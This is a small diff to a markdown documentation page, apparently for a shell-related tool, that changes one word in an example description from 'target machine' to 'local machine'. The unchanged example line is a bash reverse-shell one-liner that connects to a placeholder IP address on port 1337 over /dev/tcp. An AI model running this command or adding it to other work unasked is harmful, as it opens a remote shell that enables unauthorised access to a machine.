@@ -16,6 +16,6 @@ Makes the shell interactive
 
 ## Example
 
-The following command creates a reverse shell on a target machine in an interactive **bash**.
+The following command creates a reverse shell on a local machine in an interactive **bash**.
 
 	bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/1337 0>&1
